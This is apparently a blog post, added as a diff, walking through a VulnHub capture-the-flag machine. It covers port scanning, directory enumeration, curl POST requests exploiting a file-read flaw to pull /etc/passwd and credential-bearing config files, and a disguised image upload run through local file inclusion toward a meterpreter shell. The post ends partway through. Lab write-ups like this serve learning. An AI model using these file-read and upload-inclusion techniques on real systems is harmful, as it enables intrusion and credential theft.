@@ -1,0 +1,129 @@
+---
+layout: post
+title:  "billu: b0x"
+date:   2017-08-15 12:34
+categories: ctf
+---
+
+billu: b0x is a boot-to-root vulnerable machine found on [VulnHub](https://www.vulnhub.com/entry/billu-b0x,188/). I pulled this down and ran it in Virtualbox.
+
+Starting with an `nmap` we see there aren't many options to attack this box, but
+it does lead well to practice with enumeration.
+
+    nmap -p- 192.168.1.147
+
+{% highlight text %}
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 15:00 EDT
+Nmap scan report for indishell.hsd1.co.comcast.net (192.168.1.147)
+Host is up (0.00013s latency).
+Not shown: 65533 closed ports
+PORT &nbsp; STATE SERVICE
+22/tcp open &nbsp;ssh
+80/tcp open &nbsp;http
+MAC Address: 08:00:27:1C:31:B1 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.52 seconds
+{% endhighlight %}
+
+[[image of nmap]]
+
+
+Let's start by enumerating 
+
+    gobuster -u http://192.168.1.147 -w /usr/share/SecLists/Discovery/Web_Content/raft-large-directories.txt -e
+
+{% highlight text %}
+Gobuster v1.2                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.1.147/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/SecLists/Discovery/Web_Content/raft-large-directories.txt
+[+] Status codes : 301,302,307,200,204
+[+] Expanded     : true
+=====================================================
+http://192.168.1.147/images (Status: 301)
+http://192.168.1.147/add (Status: 200)
+http://192.168.1.147/test (Status: 200)
+http://192.168.1.147/c (Status: 200)
+http://192.168.1.147/index (Status: 200)
+http://192.168.1.147/panel (Status: 302)
+http://192.168.1.147/in (Status: 200)
+http://192.168.1.147/show (Status: 200)
+http://192.168.1.147/uploaded_images (Status: 301)
+http://192.168.1.147/head (Status: 200)
+http://192.168.1.147/phpmy (Status: 301)
+=====================================================
+{% endhighlight %}
+
+_
+
+Looking at the test.php file, we find that it is looking for a `file` parameter.
+I tried passing this a GET request but that didn't work so tested out with
+a POST.
+
+    curl -XPOST -d"file=/etc/passwd" http://192.168.1.147/test
+
+Looking at the phpmy, I found that it's phpmyadmin. That has some good
+information in the config file.
+
+    curl -XPOST -d"file=/var/www/phpmy/config.inc.php" http://192.168.1.147/test
+
+The important piece is related to the username and password that is in the
+phpmyadmin configuration file.
+
+{% highlight text %}
+$cfg['Servers'][$i]['user'] = 'root';
+$cfg['Servers'][$i]['password'] = 'roottoor';
+{% endhighlight %}
+
+I tried these credentials in the phpmyadmin login but they didn't work.
+
+__Shortcut__
+I found that I could ssh to the machine using root and the above password and
+finish this machine, however figured I'd continue looking for a different way.
+
+Using the curl script, I decided to look through the index.php file and
+associated included files until I found the c.php file
+
+    curl -XPOST -d"file=/var/www/c.php" http://192.168.1.147/test
+
+This gives us the mysql connection string used by the login page.
+
+Using these credentials, (billu:b0x_billu) we are able to get into phpmyadmin.
+_
+
+    $conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
+
+The auth table looks promising for information. Here we find another
+username/password combination (passwords stored in plain text are good for
+hackers)
+
+biLLu:hEx_it
+
+_
+
+Using this combination I was able to login to the application itself where there
+is an option to add users. This form includes a file upload section, however
+it's limited to jpg, gif, and png.
+
+Through other enumeration, I was able to find a file include vulnerability in
+the panel.php file so perhaps I could upload something through this image upload
+and have it get included in this local file inclusion vulnerability.
+
+I can't remember where I found this trick but you can start a file with a given
+character set to make the file meta data look like a jpg file.
+
+https://github.com/aaronott/SecBucket/tree/master/images
+
+Using this file, I was able to add php to the end of this file and get it
+executed using the local file include vulnerability.
+
+    msfvenom
+
+I was then able to bypass the filetype filtering in the php. On my attacking
+machine I created a meterpreter listener.
+
+Calling the panel page using the `load` parameter for the include, I was able to
+get the uploaded image to execute.
+
